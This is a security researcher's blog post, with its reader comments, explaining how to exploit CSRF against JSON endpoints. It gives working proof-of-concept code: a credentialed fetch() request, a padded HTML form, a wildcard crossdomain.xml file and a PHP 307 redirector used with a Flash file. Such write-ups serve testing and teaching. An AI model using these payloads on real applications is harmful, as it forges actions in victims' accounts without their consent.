      [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=5193#respond) [September 26, 2019 at 4:54 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-5193)
65. Pingback: [Exploiting CSRF to get free recharges | | BugL0rd](http://buglord.me/2018/06/29/exploiting-csrf-to-get-free-recharges/)
67. Pingback: [Web-Security-Learning Stuff !!! – AwesomeHackers](http://awesomehackers.org/2018/07/04/web-security-learning-stuff/)
69. ![](https://secure.gravatar.com/avatar/0b60828ba65f715a63a89061423c1eb5?s=70&d=mm&r=g) prem says:

    can anyone confirm this flash based csrf method is still working? it seems fixed like sudden..

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=2468#respond) [July 10, 2018 at 8:25 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-2468)

    * ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) Geekboy says:

      It still works in Google Chrome.

      [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=5195#respond) [September 26, 2019 at 4:56 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-5195)
71. ![](https://secure.gravatar.com/avatar/875bdd4ebf3dbd5678a0f10f6202bebd?s=70&d=mm&r=g) N00b says:

    Why 307 redirection is required? What if we directly specify the URL of the victim application in the .swf file?

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=3187#respond) [September 19, 2018 at 4:49 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-3187)
73. ![](https://secure.gravatar.com/avatar/a3258a1857737af019373674e1be11bb?s=70&d=mm&r=g) [dadhe](http://dsx.com) says:

    Got this error:

    ReferenceError: Error #1065: Variable JSON is not defined.

    at re$iinit()

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=3829#respond) [March 8, 2019 at 1:50 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-3829)
75. ![](https://secure.gravatar.com/avatar/443db787aff5d1cc7d3f0b81ab973d92?s=70&d=mm&r=g) Jaykumar says:

    It is still working

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=3865#respond) [March 21, 2019 at 1:13 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-3865)
77. Pingback: [Web-Security-Learning – penenote](https://penenote.com/chybeta-web-security-learning/)
79. ![](https://secure.gravatar.com/avatar/60337281e4e2608a029a4e3b08a20e0c?s=70&d=mm&r=g) Naresh says:

    Great work & thanks for the post.

    I am performing to the CSRF testing for Json request application in my pc, is the crossdomain xml file is required???

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=5018#respond) [August 27, 2019 at 5:45 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-5018)
81. Pingback: [Post request to include ‘Content-Type’ and JSON – inneka.com](https://inneka.com/programming/html/post-request-to-include-content-type-and-json/)
83. ![](https://secure.gravatar.com/avatar/ebf5e5b43384a51dba10a2cb58c47ecf?s=70&d=mm&r=g) Yash says:

    Can we add custom header with fetch method ?

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=6558#respond) [April 1, 2020 at 10:15 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-6558)

    * ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) Geekboy says:

      No, for now only application/json header is possilbe.

      [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=6887#respond) [June 27, 2020 at 5:20 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-6887)
85. ![](https://secure.gravatar.com/avatar/2d3c8e05fe9ef88cce5322a22a3ee2dd?s=70&d=mm&r=g) [Throdore Ronald](http://doesnot.matter) says:

    That’ sgreat Geekboy , keep it up

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=6685#respond) [May 10, 2020 at 5:53 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-6685)
87. ![](https://secure.gravatar.com/avatar/61f2fff4567e435bd73967eaed43921b?s=70&d=mm&r=g) Ankur Gupta says:

    Hi geekboy, How to Fix this Vulnerability.

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=6877#respond) [June 25, 2020 at 6:31 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-6877)

    * ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) Geekboy says:

      As this trick only works for application/JSON header, adding any custom header based CSRF protection in the request will fix this CSRF scenario.

      [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=6884#respond) [June 27, 2020 at 5:16 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-6884)
89. ![](https://secure.gravatar.com/avatar/ad14c74dcf0acdb5c25defa10dbaca73?s=70&d=mm&r=g) Ajay says:

    Is this bug(flash + 307) still exploitable ?

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=6968#respond) [July 16, 2020 at 10:15 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-6968)

    * ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) Geekboy says:

      Should be doable in Chrome after manual confirmation to run flash files.

      [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=8452#respond) [December 29, 2020 at 4:46 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-8452)
91. Pingback: [CVE-2018-1000206 - CVE.report](https://cve.report/CVE-2018-1000206)

### Leave a Reply [Cancel reply](/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#respond)

Your email address will not be published. Required fields are marked \*

Comment

Name \*

Email \*

Website

 Save my name, email, and website in this browser for the next time I comment.

[Proudly powered by WordPress](http://wordpress.org/)
 |
Theme: Fictive by [WordPress.com](https://wordpress.com/themes/).



=== Content from www.geekboy.ninja_f0e63b17_20250124_161321.html ===

[![](https://www.geekboy.ninja/blog/wp-content/uploads/2016/09/cropped-header.jpg)](https://www.geekboy.ninja/blog/)
[![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea/?s=140&d=mm)](https://www.geekboy.ninja/blog/)
# [Geekboy | Security Researcher](https://www.geekboy.ninja/blog/)

## Bug Bounty Hunter

# Menu

# Widgets

# Search

[Skip to content](#content)

* [Home](http://www.geekboy.ninja/blog)
* [About Me](https://www.geekboy.ninja/blog/about/)
* [Contact Me](https://www.geekboy.ninja/blog/contact/)

# Recent Posts

* [Exploiting unusual Referer based XSS](https://www.geekboy.ninja/blog/exploiting-unusual-referer-based-xss/)
* [Cross Site Scripting for Fun: PasteJacking](https://www.geekboy.ninja/blog/cross-site-scripting-for-fun-pastejacking/)
* [Exploiting JSON Cross Site Request Forgery (CSRF) using Flash](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/)
* [Exploiting Misconfigured CORS via Wildcard Subdomains](https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-via-wildcard-subdomains/)
* [Turning Simple Login CSRF to Account Takeover](https://www.geekboy.ninja/blog/turning-simple-login-csrf-to-account-takeover/)
# Follow Me

# Contact Me

* emgeekboy@gmail.com

Search for:

# Exploiting JSON Cross Site Request Forgery (CSRF) using Flash

[August 26, 2017](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/ "8:03 pm")[Geekboy](https://www.geekboy.ninja/blog/author/admin/ "View all posts by Geekboy")

### Update 2:

For the Case 1, there is possibility in some cases where server reject the request due to extra padding of data, but there is another and best way, using **fetch** or XHR request we can submit the json formatted data without any limitations, added poc code for the same.

Thanks to [Prakash](https://twitter.com/1lastBr3ath) for making me aware of this.

###

### Update 1:

Great work by [Evgeniy](https://twitter.com/h1_sp1d3r) who edited and compiled the Flash file in a way where users can pass all the information including JSON data, php file & target endpoint via URL parameter, which not only make all those complex procedures simpler but also remove the hectic task to recompilation of flash file each time for the Case 2.

[Here](https://github.com/sp1d3r/swf_json_csrf/) is the the updated flash and other files by [Evgeniy](https://twitter.com/h1_sp1d3r).

---

Hello Friends!

Everyone knows about basic csrf attack, if not just go through this [owasp page](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29) and *burp engagement tools* have easiest option to create csrf proof of concept for all kind of basic csrf attack including performing csrf via xhr request.

in this post i’m going to talk about csrf scenarios which i encountered many times and seen many researchers from community are curious about it, so i will try clear as much possible!

so this trick comes into play when post request data formatted into json format, eg: {“name”:”test”, “email”:”victim.com”}, which have 2 scenario.

#### Case 1:

* Server looking for json formatted data but don’t validate the Content-type

#### Case 2:

* Server looking for json formatted data and validate the Content-type as well, i.e application/json

*Note: This csrf attack only works when the application do only rely either on json formatted data or Content-type application/json, and data format check, if there is any additional csrf token/referer check at place this will not work.*

---

### Exploiting Case 1:

~~This can be achieved with little HTML trick using name attribute with padding some extra data~~, simply can be done using **Fetch** request, as we know in this case server is only checking for the post data if it’s correctly formatted or not, if yes it will accept the request regardless the **Content-type** is set as **text/plain**

Now assume we have to submit this test data to the vulnerable application: {“name”:”attacker”,”email”:”attacker@gmail.com”}

**Updated method:**

```
<html>
<title>JSON CSRF POC</title>
<body>
<center>
<h1> JSON CSRF POC </h1>
<script>
fetch('http://vul-app.com', {method: 'POST', credentials: 'include', headers: {'Content-Type': 'text/plain'}, body: '{"name":"attacker","email":"attacker.com"}'});
</script>
<form action="#">
<input type="button" value="Submit" />
</form>
</center>
</body>
</html>

```

[![](http://www.geekboy.ninja/blog/wp-content/uploads/2017/08/featchjson.png)](http://www.geekboy.ninja/blog/wp-content/uploads/2017/08/featchjson.png)

*Source: <http://research.rootme.in/forging-content-type-header-with-flash>*

**Old Method:**

```
<html>
<title>JSON CSRF POC</title>
<center>
<h1> JSON CSRF POC </h1>
<form action=http://vul-app.com method=post enctype="text/plain" >
<input name='{"name":"attacker","email":"attacker@gmail.com","ignore_me":"' value='test"}'type='hidden'>
<input type=submit value="Submit">
</form>
</center>
</html>

```

This will make post request with valid json formatted data with padding some extra data, if the application don’t care about extra data which happened in most of cases i seen. if not, there is always 2nd way to use.

[![](http://www.geekboy.ninja/blog/wp-content/uploads/2017/08/jsonpadding.png)](http://www.geekboy.ninja/blog/wp-content/uploads/2017/08/jsonpadding.png)

*Source: <http://blog.opensecurityresearch.com/2012/02/json-csrf-with-parameter-padding.html>*

---

### Exploiting Case 2:

Here even if application is validating the **Content-type** and **data format**, this attack can be achieved using **flash and 307 redirect**.

**Requirements:**

1. **Crafted Flash file**
2. **Crossdomain XML file**
3. **PHP file with 307 status code**

#### Crafted Flash file:

This flash (.swf) file have our json formatted data which attacker have to post on the target application, and link to hosted php file in it.

[![](http://www.geekboy.ninja/blog/wp-content/uploads/2017/08/flash.png)](http://www.geekboy.ninja/blog/wp-content/uploads/2017/08/flash.png)

Here is the test [SWF file](http://geekboy.ninja/files/test.swf), you can download and edit the contents as per your need, i do use [FFDec](https://www.free-decompiler.com/flash/download/) on Windows for editing and compiling the flash file, you can check others based on your environment.

#### Crossdomain XML file:

```
<cross-domain-policy>
<allow-access-from domain="*" secure="false"/>
<allow-http-request-headers-from domain="*" headers="*" secure="false"/>
</cross-domain-policy>
```

This file should be hosted on attackers website’s root directory, so flash file can make request to attacker’s host.

*Note: You don’t need crossdomain file if  flash file & redirector page is on same domain.*
#### PHP file with 307 status code:

```
<?php

// redirect automatically

header("Location: https://victim.com/user/endpoint/", true, 307);

?>
```

Flash file request for this php file, this will make 307 redirect to mentioned application endpoint, and as 307 is special redirect which will post the JSON data as well which got received from the flash file to the target endpoint and CSRF will take place successfully.

[![](http://www.geekboy.ninja/blog/wp-content/uploads/2017/08/jsonflash.png)](http://www.geekboy.ninja/blog/wp-content/uploads/2017/08/jsonflash.png)

Here is the public report [#44146](https://hackerone.com/reports/44146) by [@avlidienbrunn](https://twitter.com/avlidienbrunn) for the same.

---

*Note: As this is based on flash, so flash should be installed in browser to make it work, which is very normal for now but may not be in future.*

do let me know if you have any queries in comment section or tweet about it [here](https://twitter.com/emgeekboy) , and thanks to [Parth](https://twitter.com/Parth_Malhotra) for the proof reading.

[Share on Facebook](http://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.geekboy.ninja%2Fblog%2Fexploiting-json-cross-site-request-forgery-csrf-using-flash%2F)[Share on Twitter](http://twitter.com/intent/tweet/?text=Exploiting+JSON+Cross+Site+Request+Forgery+%28CSRF%29+using+Flash&url=https%3A%2F%2Fwww.geekboy.ninja%2Fblog%2Fexploiting-json-cross-site-request-forgery-csrf-using-flash%2F)

[CSRF](https://www.geekboy.ninja/blog/tag/csrf/)[CSRF Exploitation](https://www.geekboy.ninja/blog/tag/csrf-exploitation/)[Flash CSRF](https://www.geekboy.ninja/blog/tag/flash-csrf/)[JSON CSRF](https://www.geekboy.ninja/blog/tag/json-csrf/)

# Post navigation

[←](https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-via-wildcard-subdomains/)[→](https://www.geekboy.ninja/blog/cross-site-scripting-for-fun-pastejacking/)

## 73 thoughts on “Exploiting JSON Cross Site Request Forgery (CSRF) using Flash”

1. ![](https://secure.gravatar.com/avatar/6fdeec8d8b2f35389ca4655386084e87?s=70&d=mm&r=g) [mani](http://www.nic.in) says:

   great illustrations

   [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1088#respond) [August 27, 2017 at 8:37 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1088)
3. Pingback: [Tutoriels & Guides | Pearltrees](http://www.pearltrees.com/bugrecovery/tutoriels-guides/id18085889/item207352001)
5. ![](https://secure.gravatar.com/avatar/7526d3b510eda76054a393b522974427?s=70&d=mm&r=g) b1t says:

   Greate post ! Does the 307 redirect trick works with all version of browers/flash or just some specific one ?

   [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1092#respond) [August 28, 2017 at 8:45 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1092)

   * ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) admin says:

     Yes! most of them, in case if you noticed it’s not working for you, make sure you have Flash installed in browser.

     [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1094#respond) [August 28, 2017 at 9:46 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1094)

     + ![](https://secure.gravatar.com/avatar/3f1f651c5d6922ccc26ee673972e954f?s=70&d=mm&r=g) Pratik says:

       is it possible to exploit in GET method?

       [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1471#respond) [December 20, 2017 at 6:30 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1471)

       - ![](https://secure.gravatar.com/avatar/3f1f651c5d6922ccc26ee673972e954f?s=70&d=mm&r=g) Pratik says:

         Sorry in PUT method?

         [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1472#respond) [December 20, 2017 at 6:31 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1472)

         * ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) Geekboy says:

           Not possible.

           [January 2, 2018 at 9:04 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1495)
         * ![](https://secure.gravatar.com/avatar/0fdbac431ea207a7fc614c8ee1fc6d22?s=70&d=mm&r=g) raghav says:

           Hi,

           If you craft an XHR Request and use Internet Explorer, this can be achieved using the PUT method.

           [September 4, 2018 at 9:18 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-3124)
         * ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) Geekboy says:

           No, only GET/POST can be used for this.

           [September 26, 2019 at 4:57 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-5196)
7. ![](https://secure.gravatar.com/avatar/6259995695c0b253bda3db3c1942ba4e?s=70&d=mm&r=g) Andrew says:

   Interesting, do this trick with SWF possible also with PUT method, or it’s POST only?

   [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1095#respond) [August 28, 2017 at 8:02 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1095)

   * ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) admin says:

     No, PUT or DELETE will not work.

     [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1096#respond) [August 28, 2017 at 8:08 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1096)

     + ![](https://secure.gravatar.com/avatar/08ba4589d90bdd854dee0b61bab057f0?s=70&d=mm&r=g) Sinx says:

       can this method be done in PATCH? the app is using a PATCH method to submit the json form.

       Thanks

       [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=3429#respond) [November 15, 2018 at 10:02 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-3429)

       - ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) Geekboy says:

         No! only GET and POST

         [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=4274#respond) [May 23, 2019 at 3:47 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-4274)
       - ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) Geekboy says:

         No, only GET/POST

         [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=5198#respond) [September 26, 2019 at 5:01 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-5198)
9. Pingback: [【知识】8月28日 - 每日安全知识热点 - 莹莹之色](http://hack.hk.cn/2017/08/29/%E3%80%90%E7%9F%A5%E8%AF%86%E3%80%918%E6%9C%8828%E6%97%A5-%E6%AF%8F%E6%97%A5%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E7%83%AD%E7%82%B9/)
11. Pingback: [【知识】8月28日 – 每日安全知识热点 – 安百科技](https://vul.anbai.com/43978.html)
13. Pingback: [半月安全看看看2017八月下 – 安全0day](http://www.netsec0day.com/?p=434)
15. ![](https://secure.gravatar.com/avatar/a25a4558ce44f4f86c42fbab6d059235?s=70&d=mm&r=g) Amit Dubey says:

    Nice…i was waiting for this :p

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1110#respond) [September 3, 2017 at 5:10 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1110)

    * ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) admin says:

      🙂

      [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1111#respond) [September 3, 2017 at 9:01 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1111)
17. ![](https://secure.gravatar.com/avatar/7f42d7ac2f7f29a237c00db980ec5267?s=70&d=mm&r=g) sp1d3r says:

    Can the flash file read the response from the target?

    I tried some JSON Hijacking from the GET endpoints using event listeners with urlLoader (Event.COMPLETE) – but in this case problems with response reading was raised – and event was never reached. Looks like in this case SOP works as it should=) Got it working only with insecure crossdomain.xml on the target host.

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1114#respond) [September 3, 2017 at 11:29 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1114)

    * ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) admin says:

      You can only read the response from target host if there is misconfigured crossdomain file which allow any (\*) domain or subdomain where you can control the flash file to make request, and for exploiting that there is [framework](https://github.com/sethsec/crossdomain-exploitation-framework).

      [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1115#respond) [September 3, 2017 at 11:40 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1115)

      + ![](https://secure.gravatar.com/avatar/7f42d7ac2f7f29a237c00db980ec5267?s=70&d=mm&r=g) sp1d3r says:

        Thanks a lot for the info!

        [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1116#respond) [September 4, 2017 at 12:06 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1116)
19. Pingback: [Web-Security-Learning 学习资料 – 雨苁](http://www.ddosi.com/2017/09/19/study/)
21. ![](https://secure.gravatar.com/avatar/30a2cbba690e6f5f157aee9d8daa674f?s=70&d=mm&r=g) [JoyChou](https://joychou.org) says:

    fetch follows cors

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1156#respond) [September 21, 2017 at 3:10 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1156)
23. ![](https://secure.gravatar.com/avatar/30a2cbba690e6f5f157aee9d8daa674f?s=70&d=mm&r=g) [JoyChou](https://joychou.org) says:

    Fetch follows cors. So, fetch can exploit csrf ?

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1157#respond) [September 21, 2017 at 3:17 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1157)

    * ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) Geekboy says:

      in that case you can try html name attribute trick.

      [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1197#respond) [September 25, 2017 at 10:12 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1197)
25. Pingback: [Web-Security-Learning - iceH‘s Blog](http://www.secice.cn/107)
27. Pingback: [Web-Security-Learning – 🔰雨苁ℒ🔰](http://www.ddosi.com/2017/09/05/web-security-learning/)
29. Pingback: [Exploiting JSON CSRF - SecPulse.COM | 安全脉搏](https://www.secpulse.com/archives/61297.html)
31. ![](https://secure.gravatar.com/avatar/47324fe2b17c001456b033627602b89b?s=70&d=mm&r=g) [ak1t4](http://twitter.com/knowledge_2014) says:

    Awesome article,

    Receive a 307 redirect request as GET/POST bypass the content/type filter, this is an issue built-in from the browsers right?

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1208#respond) [September 29, 2017 at 7:42 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1208)

    * ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) Geekboy says:

      Thanks, this is intended behavior for the Flash.

      [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1215#respond) [October 2, 2017 at 7:31 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1215)
33. ![](https://secure.gravatar.com/avatar/ae2da5855dddc90c8520322015be3013?s=70&d=mm&r=g) utkarsh says:

    What if there is X-Requested-with header is?

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1212#respond) [October 1, 2017 at 5:50 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1212)

    * ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) Geekboy says:

      That’s blocked by Flash, so can’t be done!

      [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1214#respond) [October 2, 2017 at 7:29 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1214)
35. Pingback: [Exploiting JSON CSRF – 安百科技](https://vul.anbai.com/49399.html)
37. ![](https://secure.gravatar.com/avatar/47324fe2b17c001456b033627602b89b?s=70&d=mm&r=g) [ak1t4](http://twitter.com/knowledge_2014) says:

    For the flash + redirect bypass, The attacker’s host needs to have a permissive crossdomain.xml file too?

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1322#respond) [October 30, 2017 at 1:24 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1322)

    * ![](https://secure.gravatar.com/avatar/47324fe2b17c001456b033627602b89b?s=70&d=mm&r=g) [ak1t4](http://twitter.com/knowledge_2014) says:

      is “victim host”, not attacker’s host. sorry 🙂

      [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1324#respond) [October 30, 2017 at 1:25 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1324)

      + ![](https://secure.gravatar.com/avatar/47324fe2b17c001456b033627602b89b?s=70&d=mm&r=g) [ak1t4](http://twitter.com/knowledge_2014) says:

        Now i got it!

        Why it works

        To clarify, the SOP/CORS are failing in the case of 307 redirect trick (due to that fact, that during 307 redirect crossdomain.xml on the target host will be called after the POST request for some reason – so POST request wiill reach the destination), and can only prevent the response reading by the Flash application, but not prevent the CSRF attack itself (it can be the Flash fault, or the way how the browsers are handling 307 redirects of the requests, initialized by Flash applications).

        <https://hackerone.com/reports/263662>

        THANKS!

        [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1325#respond) [October 30, 2017 at 1:30 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1325)
      + ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) Geekboy says:

        No, if the **php redirector** file hosted on the same host, otherwise Yes.

        [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1326#respond) [October 30, 2017 at 1:30 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1326)
39. ![](https://secure.gravatar.com/avatar/47324fe2b17c001456b033627602b89b?s=70&d=mm&r=g) [ak1t4](http://twitter.com/knowledge_2014) says:

    For the flash + redirect bypass, The victim host needs to have a permissive crossdomain.xml file too?

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1323#respond) [October 30, 2017 at 1:24 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1323)
41. ![](https://secure.gravatar.com/avatar/b8911e91f7fb17c27f9d4feea1e0f215?s=70&d=mm&r=g) Baba Fakruddin says:

    Awesome.. Thanks for sharing

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1363#respond) [November 17, 2017 at 12:11 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1363)
43. ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) Geekboy says:

    Hey!

    No that’s not possible, adding custom header is not possible anymore with flash trick.

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1398#respond) [November 24, 2017 at 12:05 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1398)

    * ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) Geekboy says:

      Glad to know 🙂

